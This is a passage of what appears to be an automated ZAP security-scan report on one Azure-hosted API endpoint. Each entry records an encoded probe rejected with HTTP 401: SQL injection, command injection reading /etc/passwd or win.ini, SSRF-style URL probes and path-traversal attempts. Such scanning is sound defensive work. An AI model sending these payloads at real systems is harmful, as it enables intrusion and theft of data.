* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+%252F+sleep%252815%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2526cat+%252Fetc%252Fpasswd%2526
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2526sleep+15.0%2526
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2526timeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2526type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%2526cat+%252Fetc%252Fpasswd%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%2526sleep+15.0%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%2526timeout+%252FT+15.0%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%2529+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%253Bsleep+15.0%253B%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+%252F+sleep%252815%2529+%252F+%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+AND+%25271%2527%253D%25271%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+AND+%25271%2527%253D%25272%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+OR+%25271%2527%253D%25271%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253Bcat+%252Fetc%252Fpasswd%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253Bget-help+%2523
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253Bsleep+15.0%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%253Bstart-sleep+-s+15.0+%2523
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+%252F+sleep%252815%2529+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+AND+1%253D1+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+AND+1%253D2+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+or+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+OR+1%253D1+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=companyNumbers0W45pz4p
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=get-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252Fwww.google.com
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252Fwww.google.com%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252Fwww.google.com%253A80%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=https%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=https%253A%252F%252F980414377652208366%25252eowasp%25252eorg
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=https%253A%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=m15zr2u2pk23lt85r10461so6ktvccktkaadysen5gs7mms36hzbrmnnpvac
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=response.write%2528901%252C150*121%252C831%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=rklFcSoZhnmEtWfKrjCJmfugxwLtLxemYHBXVhyXIouynWnVTkOvTJRyxxGfDmVOlMbuQjCCcKEjlVdSphlbEWpXKLEDCdmIQYCKceInHRCuivBngRAEPvakehZHQSqYIMtQeMSFncArHaEWGtCcYjOFjVJnTFqOhpkWgKTHUGxvqOhVpZTDhOXfdfLmrnTUifNjUlNntnGnibdleLXUKLrHyiWRDdbKoNVNRgbUxPJDPSiqPVClGAIprGIrAAnTOQQygjrSwMNlSkGoSomWYCkWesDmWRmdxQvcfwMxkSLpAQhZgTwdGsBoCLmqFTLBMjBuRDydCOwuiXOdkgqVtpQcmAWZmQheRhciZKeydMYWDThHxHfKUFcSrHrQYykOKyxCZtgCbxVTFbgQFrlQdRqXVPDhcfBlwHghNcXJrSuqDpXKfyhEMLXgiiuieFOYcMRjtdcyjQJqbtMeTVjxRfGPSiDobyVYYsqcawrcONgZqguaLZegeHUqVbdQPlLmCPLSTnGCcwWUEMPScrQqeuFkvCOfRtjVQhRBpNHVtaTBBwuMfRDVdUESuaEiQmoHjNxUdRqIrWplwvVTJFekuLeatsqcdrGYvbZphRrELCxYaWADAHsqQYMPZJmtxIulkfeqrhyOQtAixPybfKlmAVQdlBqIgFRKgwrTytdQUYWRxHiELpXcZYtSDoMSxKoxxelNNvJNiTsNxvnsFASVOxnCVOMrGguupJyxpHGdBLdITWbtovtTSxsjRHAnLbqrWivPEsaIueuKwgnfwePWWTsHsiJCMXwkOAtDKnivBrYxkWScejXgAfgfcPmmoUxvmImucaUtvOTRyAKTTZQKQasZpTKSVJUuAIHVBhjnwBLxKRDgibKJWFQjpsTulMadPYYCvqeWJVpiGqTRwiaCuBhtVernPaBxoLSAWRWqrvFREURtxhUBjjUwsDAXTwKTUFlyJmGavRtoAnoZFUknwqVGcwLivAiignwXZSbZjBZKWjWgtUvMOAjnVmBDMLNpsSoaKLjnsUFZtNyjyocdhckadnfCjXLQgEqUvRvWVCHDYxVRaRCltnCqlDjievqIwwPHfeOfXGGRnjPNRfToNQSdZkaJJuYdLAEvHaDFkSuvjfbyDqSeEQdfvjLoWqiFrKthntVoKWMcdtgZQglBVXPhvRKUpcejgHfkOoSyEcrbdgDdAJOKUPPEliVHmfVjobETxxrxFxjKCKpQZMxaqigdMbNOhWRctCbJCKMDHAXHvbdXdfUyeIebiRDTGExyxAMAQYRaCLbIjfCognmKRyCSIyaoJFMxYAtULPRQPnIpMLOxuGLJitYkXSVHACudVEkRHvTfoHOEUMEeyyQbrLTVgutMEocblSZwsBVvyASXbSrLLUEPgRWCWUEDWNLhTjcBgjDyYvxdLcoXmEjdZGZCcZChKACWwCSBTKjYVEXSwnJooMTPmrVfllLkylPhyLCRObJfjwZvpwWmKwHmcmyFWYfDOTuPQOhxAtcMxPckmwTwrOWvxCSWRlwcAfhSigskjevvKmFgZgmkptFtbfSOnkIIeigEdlBnYGiQpNnfWFWdqmkntwsMKAhFcicEnNtePJhAxvGtJAswJDSOcmadYYyNLhSiLSsEdckANZyfpjuLPPaPSCwwisYtvBussGpukIaTHaCmglKIYdnVRBTbUYnkuRmENvTWWxfELhSfFybCIfeNXadkxWVXLlUoRWPwsEDWBjTvsFkVsajBbkPDovjXvGWBOUMiMoucgWtVcAArqKigsDdUBhDJfXIEHXICAVGbJfTLKjUQtBLABuXwJKKkNWQrbDeQvCLIJOgKCkpTdUOkfBiPqsqGAspYSCRexIRZNGnCvLxifqKifDJciUjoFfHJkvDJABYEigGGmtUmEEGaWxBuIaTFYclFHxVqABmvmwYouKaKjNxocmXCdrnDsPYEjPfjbmoyFbofjcWRXdGOBOalfBuRlqdQXeoxYikkttucLiUiVyHgTRFGaKMoowusAAVZVPjoCBGnHXlmrqbwCuWADyZuLpeFDXInnEWyQwHFyXAYhOYVKroLgsahBYIXVttMTouHFEBeObDNvoYN
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=Set-cookie%253A+Tamper%253Dd0675c52-b33d-4f4d-9d2e-6839ae1eb396
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=suggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=thishouldnotexistandhopefullyitwillnot
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=URL%253D%2527http%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=WEB-INF%252Fweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/trusts/suggest%3FcompanyNumbers=WEB-INF%255Cweb.xml
  * Method: `POST`
  * Parameter: ``
